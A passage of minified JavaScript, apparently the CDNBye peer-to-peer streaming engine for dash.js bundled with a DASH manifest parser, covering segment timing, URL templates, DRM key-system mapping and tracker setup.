r;return-1},includes=(e,t)=>e.some((e=>e===t)),union=(e,t)=>values(e.reduce(((e,r)=>(r.forEach((r=>{e[t(r)]=r})),e)),{})),mpd_parser_errors={INVALID_NUMBER_OF_PERIOD:"INVALID_NUMBER_OF_PERIOD",DASH_EMPTY_MANIFEST:"DASH_EMPTY_MANIFEST",DASH_INVALID_XML:"DASH_INVALID_XML",NO_BASE_URL:"NO_BASE_URL",MISSING_SEGMENT_INFORMATION:"MISSING_SEGMENT_INFORMATION",SEGMENT_TIME_UNSPECIFIED:"SEGMENT_TIME_UNSPECIFIED",UNSUPPORTED_UTC_TIMING_SCHEME:"UNSUPPORTED_UTC_TIMING_SCHEME"},vhs_utils_atob=e=>window.atob?window.atob(e):Buffer.from(e,"base64").toString("binary");function decodeB64ToUint8Array(e){const t=vhs_utils_atob(e),r=new Uint8Array(t.length);for(let e=0;e<t.length;e++)r[e]=t.charCodeAt(e);return r}const DEFAULT_LOCATION="http://example.com",resolveUrl=(e,t)=>{if(/^[a-z]+:/i.test(t))return t;/^data:/.test(e)&&(e=window.location&&window.location.href||"");const r="function"==typeof window.URL,s=/^\/\//.test(e),i=!window.location&&!/\/\//i.test(e);if(r?e=new window.URL(e,window.location||DEFAULT_LOCATION):/\/\//i.test(e)||(e=url_toolkit_default().buildAbsoluteURL(window.location&&window.location.href||"",e)),r){const r=new URL(t,e);return i?r.href.slice(DEFAULT_LOCATION.length):s?r.href.slice(r.protocol.length):r.href}return url_toolkit_default().buildAbsoluteURL(e,t)},urlTypeToSegment=({baseUrl:e="",source:t="",range:r="",indexRange:s=""})=>{const i={uri:t,resolvedUri:resolveUrl(e||"",t)};if(r||s){const e=(r||s).split("-");let t,n=window.BigInt?window.BigInt(e[0]):parseInt(e[0],10),o=window.BigInt?window.BigInt(e[1]):parseInt(e[1],10);n<Number.MAX_SAFE_INTEGER&&"bigint"==typeof n&&(n=Number(n)),o<Number.MAX_SAFE_INTEGER&&"bigint"==typeof o&&(o=Number(o)),t="bigint"==typeof o||"bigint"==typeof n?window.BigInt(o)-window.BigInt(n)+window.BigInt(1):o-n+1,"bigint"==typeof t&&t<Number.MAX_SAFE_INTEGER&&(t=Number(t)),i.byterange={length:t,offset:n}}return i},byteRangeToString=e=>{let t;return t="bigint"==typeof e.offset||"bigint"==typeof e.length?window.BigInt(e.offset)+window.BigInt(e.length)-window.BigInt(1):e.offset+e.length-1,`${e.offset}-${t}`},urlType=urlTypeToSegment,parseEndNumber=e=>(e&&"number"!=typeof e&&(e=parseInt(e,10)),isNaN(e)?null:e),segmentRange={static(e){const{duration:t,timescale:r=1,sourceDuration:s,periodDuration:i}=e,n=parseEndNumber(e.endNumber),o=t/r;return"number"==typeof n?{start:0,end:n}:"number"==typeof i?{start:0,end:i/o}:{start:0,end:s/o}},dynamic(e){const{NOW:t,clientOffset:r,availabilityStartTime:s,timescale:i=1,duration:n,periodStart:o=0,minimumUpdatePeriod:a=0,timeShiftBufferDepth:h=1/0}=e,c=parseEndNumber(e.endNumber),l=(t+r)/1e3,u=s+o,d=l+a-u,f=Math.ceil(d*i/n),_=Math.floor((l-u-h)*i/n),p=Math.floor((l-u)*i/n);return{start:Math.max(0,_),end:"number"==typeof c?c:Math.min(f,p)}}},toSegments=e=>t=>{const{duration:r,timescale:s=1,periodStart:i,startNumber:n=1}=e;return{number:n+t,duration:r/s,timeline:i,time:t*r}},parseByDuration=e=>{const{type:t,duration:r,timescale:s=1,periodDuration:i,sourceDuration:n}=e,{start:o,end:a}=segmentRange[t](e),h=range(o,a).map(toSegments(e));if("static"===t){const e=h.length-1,t="number"==typeof i?i:n;h[e].duration=t-r/s*e}return h},segmentsFromBase=e=>{const{baseUrl:t,initialization:r={},sourceDuration:s,indexRange:i="",periodStart:n,presentationTime:o,number:a=0,duration:h}=e;if(!t)throw new Error(mpd_parser_errors.NO_BASE_URL);const c=urlType({baseUrl:t,source:r.sourceURL,range:r.range}),l=urlType({baseUrl:t,source:t,indexRange:i});if(l.map=c,h){const t=parseByDuration(e);t.length&&(l.duration=t[0].duration,l.timeline=t[0].timeline)}else s&&(l.duration=s,l.timeline=n);return l.presentationTime=o||n,l.number=a,[l]},addSidxSegmentsToPlaylist=(e,t,r)=>{const s=e.sidx.map?e.sidx.map:null,i=e.sidx.duration,n=e.timeline||0,o=e.sidx.byterange,a=o.offset+o.length,h=t.timescale,c=t.references.filter((e=>1!==e.referenceType)),l=[],u=e.endList?"static":"dynamic",d=e.sidx.timeline;let f,_=d,p=e.mediaSequence||0;f="bigint"==typeof t.firstOffset?window.BigInt(a)+t.firstOffset:a+t.firstOffset;for(let e=0;e<c.length;e++){const o=t.references[e],a=o.referencedSize,c=o.subsegmentDuration;let g;g="bigint"==typeof f?f+window.BigInt(a)-window.BigInt(1):f+a-1;const m=segmentsFromBase({baseUrl:r,timescale:h,timeline:n,periodStart:d,presentationTime:_,number:p,duration:c,sourceDuration:i,indexRange:`${f}-${g}`,type:u})[0];s&&(m.map=s),l.push(m),f+="bigint"==typeof f?window.BigInt(a):a,_+=c/h,p++}return e.segments=l,e},getUniqueTimelineStarts=e=>union(e,(({timeline:e})=>e)).sort(((e,t)=>e.timeline>t.timeline?1:-1)),findPlaylistWithName=(e,t)=>{for(let r=0;r<e.length;r++)if(e[r].attributes.NAME===t)return e[r];return null},updateMediaSequenceForPlaylist=({playlist:e,mediaSequence:t})=>{e.mediaSequence=t,e.segments.forEach(((t,r)=>{t.number=e.mediaSequence+r}))},generateSidxKey=e=>e&&e.uri+"-"+byteRangeToString(e.byterange),mergeDiscontiguousPlaylists=e=>values(e.reduce(((e,t)=>{const r=t.attributes.id+(t.attributes.lang||"");return e[r]?(t.segments&&(t.segments[0]&&(t.segments[0].discontinuity=!0),e[r].segments.push(...t.segments)),t.attributes.contentProtection&&(e[r].attributes.contentProtection=t.attributes.contentProtection)):(e[r]=t,e[r].attributes.timelineStarts=[]),e[r].attributes.timelineStarts.push({start:t.attributes.periodStart,timeline:t.attributes.periodStart}),e}),{})).map((e=>(e.discontinuityStarts=findIndexes(e.segments||[],"discontinuity"),e))),toM3u8_addSidxSegmentsToPlaylist=(e,t)=>{const r=generateSidxKey(e.sidx),s=r&&t[r]&&t[r].sidx;return s&&addSidxSegmentsToPlaylist(e,s,e.sidx.resolvedUri),e},addSidxSegmentsToPlaylists=(e,t={})=>{if(!Object.keys(t).length)return e;for(const r in e)e[r]=toM3u8_addSidxSegmentsToPlaylist(e[r],t);return e},formatAudioPlaylist=({attributes:e,segments:t,sidx:r,mediaSequence:s,discontinuitySequence:i,discontinuityStarts:n},o)=>{const a={attributes:{NAME:e.id,BANDWIDTH:e.bandwidth,CODECS:e.codecs,"PROGRAM-ID":1},uri:"",endList:"static"===e.type,timeline:e.periodStart,resolvedUri:"",targetDuration:e.duration,discontinuitySequence:i,discontinuityStarts:n,timelineStarts:e.timelineStarts,mediaSequence:s,segments:t};return e.contentProtection&&(a.contentProtection=e.contentProtection),r&&(a.sidx=r),o&&(a.attributes.AUDIO="audio",a.attributes.SUBTITLES="subs"),a},formatVttPlaylist=({attributes:e,segments:t,mediaSequence:r,discontinuityStarts:s,discontinuitySequence:i})=>{void 0===t&&(t=[{uri:e.baseUrl,timeline:e.periodStart,resolvedUri:e.baseUrl||"",duration:e.sourceDuration,number:0}],e.duration=e.sourceDuration);const n={NAME:e.id,BANDWIDTH:e.bandwidth,"PROGRAM-ID":1};return e.codecs&&(n.CODECS=e.codecs),{attributes:n,uri:"",endList:"static"===e.type,timeline:e.periodStart,resolvedUri:e.baseUrl||"",targetDuration:e.duration,timelineStarts:e.timelineStarts,discontinuityStarts:s,discontinuitySequence:i,mediaSequence:r,segments:t}},organizeAudioPlaylists=(e,t={},r=!1)=>{let s;const i=e.reduce(((e,i)=>{const n=i.attributes.role&&i.attributes.role.value||"",o=i.attributes.lang||"";let a=i.attributes.label||"main";if(o&&!i.attributes.label){const e=n?` (${n})`:"";a=`${i.attributes.lang}${e}`}e[a]||(e[a]={language:o,autoselect:!0,default:"main"===n,playlists:[],uri:""});const h=toM3u8_addSidxSegmentsToPlaylist(formatAudioPlaylist(i,r),t);return e[a].playlists.push(h),void 0===s&&"main"===n&&(s=i,s.default=!0),e}),{});if(!s){i[Object.keys(i)[0]].default=!0}return i},organizeVttPlaylists=(e,t={})=>e.reduce(((e,r)=>{const s=r.attributes.lang||"text";return e[s]||(e[s]={language:s,default:!1,autoselect:!1,playlists:[],uri:""}),e[s].playlists.push(toM3u8_addSidxSegmentsToPlaylist(formatVttPlaylist(r),t)),e}),{}),formatVideoPlaylist=({attributes:e,segments:t,sidx:r,discontinuityStarts:s})=>{const i={attributes:{NAME:e.id,AUDIO:"audio",SUBTITLES:"subs",RESOLUTION:{width:e.width,height:e.height},CODECS:e.codecs,BANDWIDTH:e.bandwidth,"PROGRAM-ID":1},uri:"",endList:"static"===e.type,timeline:e.periodStart,resolvedUri:"",targetDuration:e.duration,discontinuityStarts:s,timelineStarts:e.timelineStarts,segments:t,bandwidth:e.bandwidth};return e.contentProtection&&(i.contentProtection=e.contentProtection),r&&(i.sidx=r),i},videoOnly=({attributes:e})=>"video/mp4"===e.mimeType||"video/webm"===e.mimeType||"video"===e.contentType,audioOnly=({attributes:e})=>"audio/mp4"===e.mimeType||"audio/webm"===e.mimeType||"audio"===e.contentType,vttOnly=({attributes:e})=>"text/vtt"===e.mimeType||"text"===e.contentType,addMediaSequenceValues=(e,t)=>{e.forEach((e=>{e.mediaSequence=0,e.discontinuitySequence=findIndex(t,(({timeline:t})=>t===e.timeline)),e.segments&&e.segments.forEach(((e,t)=>{e.number=t}))}))},flattenMediaGroupPlaylists=e=>e?Object.keys(e).reduce(((t,r)=>{const s=e[r];return t.concat(s.playlists)}),[]):[],toM3u8=({dashPlaylists:e,locations:t,sidxMapping:r={}})=>{if(!e.length)return{};const{sourceDuration:s,type:i,suggestedPresentationDelay:n,minimumUpdatePeriod:o}=e[0].attributes,a=mergeDiscontiguousPlaylists(e.filter(videoOnly)).map(formatVideoPlaylist),h=mergeDiscontiguousPlaylists(e.filter(audioOnly)),c=mergeDiscontiguousPlaylists(e.filter(vttOnly));a.sort(((e,t)=>e.bandwidth-t.bandwidth));const l={discontinuityStarts:[],segments:[],endList:!0,uri:"",duration:s,playlists:addSidxSegmentsToPlaylists(a,r)};o>=0&&(l.minimumUpdatePeriod=1e3*o),t&&(l.locations=t),"dynamic"===i&&(l.suggestedPresentationDelay=n);const u=0===l.playlists.length,d=h.length?organizeAudioPlaylists(h,r,u):null,f=c.length?organizeVttPlaylists(c,r):null,_=a.concat(flattenMediaGroupPlaylists(d),flattenMediaGroupPlaylists(f)),p=_.map((({timelineStarts:e})=>e));return l.timelineStarts=getUniqueTimelineStarts(p),addMediaSequenceValues(_,l.timelineStarts),l},getLiveRValue=(e,t,r)=>{const{NOW:s,clientOffset:i,availabilityStartTime:n,timescale:o=1,periodStart:a=0,minimumUpdatePeriod:h=0}=e,c=(s+i)/1e3+h-(n+a);return Math.ceil((c*o-t)/r)},parseByTimeline=(e,t)=>{const{type:r,minimumUpdatePeriod:s=0,media:i="",sourceDuration:n,timescale:o=1,startNumber:a=1,periodStart:h}=e,c=[];let l=-1;for(let u=0;u<t.length;u++){const d=t[u],f=d.d,_=d.r||0,p=d.t||0;let g;if(l<0&&(l=p),p&&p>l&&(l=p),_<0){const a=u+1;g=a===t.length?"dynamic"===r&&s>0&&i.indexOf("$Number$")>0?getLiveRValue(e,l,f):(n*o-l)/f:(t[a].t-l)/f}else g=_+1;const m=a+c.length+g;let E=a+c.length;for(;E<m;)c.push({number:E,duration:f/o,time:l,timeline:h}),l+=f,E++}return c},identifierPattern=/\$([A-z]*)(?:(%0)([0-9]+)d)?\$/g,identifierReplacement=e=>(t,r,s,i)=>{if("$$"===t)return"$";if(void 0===e[r])return t;const n=""+e[r];return"RepresentationID"===r?n:(i=s?parseInt(i,10):1,n.length>=i?n:`${new Array(i-n.length+1).join("0")}${n}`)},constructTemplateUrl=(e,t)=>e.replace(identifierPattern,identifierReplacement(t)),parseTemplateInfo=(e,t)=>e.duration||t?e.duration?parseByDuration(e):parseByTimeline(e,t):[{number:e.startNumber||1,duration:e.sourceDuration,time:0,timeline:e.periodStart}],segmentsFromTemplate=(e,t)=>{const r={RepresentationID:e.id,Bandwidth:e.bandwidth||0},{initialization:s={sourceURL:"",range:""}}=e,i=urlType({baseUrl:e.baseUrl,source:constructTemplateUrl(s.sourceURL,r),range:s.range});return parseTemplateInfo(e,t).map((t=>{r.Number=t.number,r.Time=t.time;const s=constructTemplateUrl(e.media||"",r),n=e.timescale||1,o=e.presentationTimeOffset||0,a=e.periodStart+(t.time-o)/n;return{uri:s,timeline:t.timeline,duration:t.duration,resolvedUri:resolveUrl(e.baseUrl||"",s),map:i,number:t.number,presentationTime:a}}))},SegmentURLToSegmentObject=(e,t)=>{const{baseUrl:r,initialization:s={}}=e,i=urlType({baseUrl:r,source:s.sourceURL,range:s.range}),n=urlType({baseUrl:r,source:t.media,range:t.mediaRange});return n.map=i,n},segmentsFromList=(e,t)=>{const{duration:r,segmentUrls:s=[],periodStart:i}=e;if(!r&&!t||r&&t)throw new Error(mpd_parser_errors.SEGMENT_TIME_UNSPECIFIED);const n=s.map((t=>SegmentURLToSegmentObject(e,t)));let o;r&&(o=parseByDuration(e)),t&&(o=parseByTimeline(e,t));return o.map(((t,r)=>{if(n[r]){const s=n[r],o=e.timescale||1,a=e.presentationTimeOffset||0;return s.timeline=t.timeline,s.duration=t.duration,s.number=t.number,s.presentationTime=i+(t.time-a)/o,s}})).filter((e=>e))},generateSegments=({attributes:e,segmentInfo:t})=>{let r,s;t.template?(s=segmentsFromTemplate,r=merge(e,t.template)):t.base?(s=segmentsFromBase,r=merge(e,t.base)):t.list&&(s=segmentsFromList,r=merge(e,t.list));const i={attributes:e};if(!s)return i;const n=s(r,t.segmentTimeline);if(r.duration){const{duration:e,timescale:t=1}=r;r.duration=e/t}else n.length?r.duration=n.reduce(((e,t)=>Math.max(e,Math.ceil(t.duration))),0):r.duration=0;return i.attributes=r,i.segments=n,t.base&&r.indexRange&&(i.sidx=n[0],i.segments=[]),i},toPlaylists=e=>e.map(generateSegments),findChildren=(e,t)=>from(e.childNodes).filter((({tagName:e})=>e===t)),getContent=e=>e.textContent.trim(),parseDuration=e=>{const t=/P(?:(\d*)Y)?(?:(\d*)M)?(?:(\d*)D)?(?:T(?:(\d*)H)?(?:(\d*)M)?(?:([\d.]*)S)?)?/.exec(e);if(!t)return 0;const[r,s,i,n,o,a]=t.slice(1);return 31536e3*parseFloat(r||0)+2592e3*parseFloat(s||0)+86400*parseFloat(i||0)+3600*parseFloat(n||0)+60*parseFloat(o||0)+parseFloat(a||0)},parseDate=e=>(/^\d+-\d+-\d+T\d+:\d+:\d+(\.\d+)?$/.test(e)&&(e+="Z"),Date.parse(e)),parsers={mediaPresentationDuration:e=>parseDuration(e),availabilityStartTime:e=>parseDate(e)/1e3,minimumUpdatePeriod:e=>parseDuration(e),suggestedPresentationDelay:e=>parseDuration(e),type:e=>e,timeShiftBufferDepth:e=>parseDuration(e),start:e=>parseDuration(e),width:e=>parseInt(e,10),height:e=>parseInt(e,10),bandwidth:e=>parseInt(e,10),startNumber:e=>parseInt(e,10),timescale:e=>parseInt(e,10),presentationTimeOffset:e=>parseInt(e,10),duration(e){const t=parseInt(e,10);return isNaN(t)?parseDuration(e):t},d:e=>parseInt(e,10),t:e=>parseInt(e,10),r:e=>parseInt(e,10),DEFAULT:e=>e},parseAttributes=e=>e&&e.attributes?from(e.attributes).reduce(((e,t)=>{const r=parsers[t.name]||parsers.DEFAULT;return e[t.name]=r(t.value),e}),{}):{},keySystemsMap={"urn:uuid:1077efec-c0b2-4d02-ace3-3c1e52e2fb4b":"org.w3.clearkey","urn:uuid:edef8ba9-79d6-4ace-a3c8-27dcd51d21ed":"com.widevine.alpha","urn:uuid:9a04f079-9840-4286-ab92-e65be0885f95":"com.microsoft.playready","urn:uuid:f239e769-efa3-4850-9c16-a903c6932efb":"com.adobe.primetime"},buildBaseUrls=(e,t)=>t.length?flatten(e.map((function(e){return t.map((function(t){return resolveUrl(e,getContent(t))}))}))):e,getSegmentInformation=e=>{const t=findChildren(e,"SegmentTemplate")[0],r=findChildren(e,"SegmentList")[0],s=r&&findChildren(r,"SegmentURL").map((e=>merge({tag:"SegmentURL"},parseAttributes(e)))),i=findChildren(e,"SegmentBase")[0],n=r||t,o=n&&findChildren(n,"SegmentTimeline")[0],a=r||i||t,h=a&&findChildren(a,"Initialization")[0],c=t&&parseAttributes(t);c&&h?c.initialization=h&&parseAttributes(h):c&&c.initialization&&(c.initialization={sourceURL:c.initialization});const l={template:c,segmentTimeline:o&&findChildren(o,"S").map((e=>parseAttributes(e))),list:r&&merge(parseAttributes(r),{segmentUrls:s,initialization:parseAttributes(h)}),base:i&&merge(parseAttributes(i),{initialization:parseAttributes(h)})};return Object.keys(l).forEach((e=>{l[e]||delete l[e]})),l},inheritBaseUrls=(e,t,r)=>s=>{const i=findChildren(s,"BaseURL"),n=buildBaseUrls(t,i),o=merge(e,parseAttributes(s)),a=getSegmentInformation(s);return n.map((e=>({segmentInfo:merge(r,a),attributes:merge(o,{baseUrl:e})})))},generateKeySystemInformation=e=>e.reduce(((e,t)=>{const r=parseAttributes(t);r.schemeIdUri&&(r.schemeIdUri=r.schemeIdUri.toLowerCase());const s=keySystemsMap[r.schemeIdUri];if(s){e[s]={attributes:r};const i=findChildren(t,"cenc:pssh")[0];if(i){const t=getContent(i);e[s].pssh=t&&decodeB64ToUint8Array(t)}}return e}),{}),parseCaptionServiceMetadata=e=>{if("urn:scte:dash:cc:cea-608:2015"===e.schemeIdUri){return("string"!=typeof e.value?[]:e.value.split(";")).map((e=>{let t,r;return r=e,/^CC\d=/.test(e)?[t,r]=e.split("="):/^CC\d$/.test(e)&&(t=e),{channel:t,language:r}}))}if("urn:scte:dash:cc:cea-708:2015"===e.schemeIdUri){return("string"!=typeof e.value?[]:e.value.split(";")).map((e=>{const t={channel:void 0,language:void 0,aspectRatio:1,easyReader:0,"3D":0};if(/=/.test(e)){const[r,s=""]=e.split("=");t.channel=r,t.language=e,s.split(",").forEach((e=>{const[r,s]=e.split(":");"lang"===r?t.language=s:"er"===r?t.easyReader=Number(s):"war"===r?t.aspectRatio=Number(s):"3D"===r&&(t["3D"]=Number(s))}))}else t.language=e;return t.channel&&(t.channel="SERVICE"+t.channel),t}))}},toRepresentations=(e,t,r)=>s=>{const i=parseAttributes(s),n=buildBaseUrls(t,findChildren(s,"BaseURL")),o=findChildren(s,"Role")[0],a={role:parseAttributes(o)};let h=merge(e,i,a);const c=findChildren(s,"Accessibility")[0],l=parseCaptionServiceMetadata(parseAttributes(c));l&&(h=merge(h,{captionServices:l}));const u=findChildren(s,"Label")[0];if(u&&u.childNodes.length){const e=u.childNodes[0].nodeValue.trim();h=merge(h,{label:e})}const d=generateKeySystemInformation(findChildren(s,"ContentProtection"));Object.keys(d).length&&(h=merge(h,{contentProtection:d}));const f=getSegmentInformation(s),_=findChildren(s,"Representation"),p=merge(r,f);return flatten(_.map(inheritBaseUrls(h,n,p)))},toAdaptationSets=(e,t)=>(r,s)=>{const i=buildBaseUrls(t,findChildren(r.node,"BaseURL")),n=merge(e,{periodStart:r.attributes.start});"number"==typeof r.attributes.duration&&(n.periodDuration=r.attributes.duration);const o=findChildren(r.node,"AdaptationSet"),a=getSegmentInformation(r.node);return flatten(o.map(toRepresentations(n,i,a)))},getPeriodStart=({attributes:e,priorPeriodAttributes:t,mpdType:r})=>"number"==typeof e.start?e.start:t&&"number"==typeof t.start&&"number"==typeof t.duration?t.start+t.duration:t||"static"!==r?null:0,inheritAttributes=(e,t={})=>{const{manifestUri:r="",NOW:s=Date.now(),clientOffset:i=0}=t,n=findChildren(e,"Period");if(!n.length)throw new Error(mpd_parser_errors.INVALID_NUMBER_OF_PERIOD);const o=findChildren(e,"Location"),a=parseAttributes(e),h=buildBaseUrls([r],findChildren(e,"BaseURL"));a.type=a.type||"static",a.sourceDuration=a.mediaPresentationDuration||0,a.NOW=s,a.clientOffset=i,o.length&&(a.locations=o.map(getContent));const c=[];return n.forEach(((e,t)=>{const r=parseAttributes(e),s=c[t-1];r.start=getPeriodStart({attributes:r,priorPeriodAttributes:s?s.attributes:null,mpdType:a.type}),c.push({node:e,attributes:r})})),{locations:a.locations,representationInfo:flatten(c.map(toAdaptationSets(a,h)))}};var lib=__webpack_require__(716);const stringToMpdXml=e=>{if(""===e)throw new Error(mpd_parser_errors.DASH_EMPTY_MANIFEST);const t=new lib.DOMParser;let r,s;try{r=t.parseFromString(e,"application/xml"),s=r&&"MPD"===r.documentElement.tagName?r.documentElement:null}catch(e){}if(!s||s&&s.getElementsByTagName("parsererror").length>0)throw new Error(mpd_parser_errors.DASH_INVALID_XML);return s},parse=(e,t={})=>{const r=inheritAttributes(stringToMpdXml(e),t),s=toPlaylists(r.representationInfo);return toM3u8({dashPlaylists:s,locations:r.locations,sidxMapping:t.sidxMapping})};if(window){if(window.p2ploadedDash)throw new Error("You are loading the p2p library multiple times. Please load it only once.");window.p2ploadedDash=!0}class P2PEngineDash extends engine_base{static get Events(){return core_events}static get mpdParse(){return parse}constructor(e,t={}){super(t),this.config=Object.assign({},dashjs_config,t),this.player=e,this.currentSN=-1,this.rangeTested=!1,this.currentLevel=0;const r=this.initLogger(),s=frag_loader(this,this.config);this.player.extend("FragmentLoader",s,!0),this.DashjsEvents=dashjs.MediaPlayer.events,this.fragMap=new Map;let{token:i,channelId:n,segmentId:o}=this.config;i||(i=this.config.channelIdPrefix);let a=e=>{const t=url_toolkit_default().parseURL(e);return`${t.netLoc.substr(2)+t.path.substring(0,t.path.lastIndexOf("."))}`},h=(e,t)=>{let r=e.split("?")[0];return r.startsWith("http")&&(r=r.split("://")[1]),t?`${r}|bytes=${t}`:`${r}`};n&&"function"==typeof n&&(a=this.makeChannelId(i,n)),o||(this.config.segmentId=h);const c=this.makeSignalId();this.player.on("originalManifestLoaded",this._onManifestLoaded.bind(this));const l=()=>{const{config:t}=this;let s=this.player.isDynamic();t.live=s,s||(t.trickleICE=!0);const i=this.commonBrowserInfo;this.browserInfo={...i,tag:t.tag||void 0,live:s,type:"dash"},i.device===platform_default().PC_NATIVE&&(this.browserInfo={...this.browserInfo,app:t.appName,bundle:t.appId}),this.channel=`${a(e.getSource())}|${c}[${peer.VERSION}]d`,r.info(`CDNBye version: ${P2PEngineDash.version} Dashjs version: ${e.getVersion()}`),r.info(`channel ${this.channel}`),this.eventListened=!1,this._init(this.channel,this.browserInfo),this.player.off(this.DashjsEvents.STREAM_INITIALIZED,l,this)};this.player.on(this.DashjsEvents.STREAM_INITIALIZED,l,this)}_init(e,t){if(!this.p2pEnabled)return;this.bufMgr=new segment_cache(this,this.config,!1),this.media=this.player.getVideoElement(),this.offEventRebuffer=listenMediaRebuffer(this.media,(()=>{this.fetcher&&this.fetcher.increRebuffers()}));let r=new server(this,this.config.token,window.encodeURIComponent(e),this.config.announce||"",t);this.fetcher=this.config.fetcher=r;const s=new DashScheduler(this,this.config);this.tracker=new tracker_client(this,r,s,this.config),this.tracker.scheduler.bufferManager=this.config.bufMgr=this.bufMgr,this.config.scheduler=this.tracker.scheduler,this.config.isReady=!0,this.trackerTried=!1,this.eventListened||(this.player.on(this.DashjsEvents.FRAGMENT_LOADING_STARTED,this._onFragLoading.bind(this)),this.player.on(this.DashjsEvents.FRAGMENT_LOADING_COMPLETED,this._onFragLoaded.bind(this)),this.player.on(this.DashjsEvents.ERROR,this._onDashError.bind(this)),this.eventListened=!0),this.setupWindowListeners(),this.trackerTried||this.tracker.connected||!this.config.p2pEnabled||(this.tracker.resumeP2P(),this.trackerTried=!0)}_onFragLoading({request:e}){("video"===e.mediaType||"audio"===e.mediaType)&&isNaN(e.index)}_onFragLoaded({request:e}){if(("video"===e.mediaType||"audio"===e.mediaType)&&!isNaN(e.index)){const{config:t,logger:r}=this;!this.rangeTested&&t.useHttpRange&&(performRangeRequest(e.url).then((()=>{t.httpRangeSupported=!0,r.info("http range is supported")})).catch((()=>{t.httpRangeSupported=!1,r.warn("http range is not supported")})),this.rangeTested=!0)}}_onManifestLoaded({originalManifest:e}){const{playlists:t}=parse(e,{manifestUri:this.player.getSource()});let r=0;for(let e of t)e.segments.forEach((e=>{let t=e.resolvedUri;const s=e.byterange;let i;s&&(i=`bytes=${byteRangeToString(s)}`);const n=this.config.segmentId(t,i);this.fragMap.set(n,{level:r,sn:e.number,url:e.resolvedUri,duration:e.duration,range:i})})),r++}_onDashError(e){this.logger.warn(`code ${e.code} reason ${e.message}`),this.emit(core_events.EXCEPTION,err_code_default()(e,"DASHJS_EXPT"))}disableP2P(){this.logger&&this.logger.warn("disable P2P"),this.offEventRebuffer(),this.p2pEnabled&&(this.p2pEnabled=this.config.p2pEnabled=!1,this.tracker&&(this.tracker.stopP2P(),this.tracker={},this.fetcher=null,this.bufMgr.destroy(),this.bufMgr=null))}getExtraForStats(){const e=super.getExtraForStats();return this.config.live||(e.pos=Math.round(this.media.currentTime)),this.currentLevel!==this.lastLevel&&(e.level=this.currentLevel+"",this.lastLevel=this.currentLevel),e}getExtraForPeersRequest(){return{...super.getExtraForPeersRequest(),level:this.currentLevel+""}}}window&&(window.P2pEngineDash=P2PEngineDash);const index_engine=P2PEngineDash})(),__webpack_exports__=__webpack_exports__.default,__webpack_exports__})()));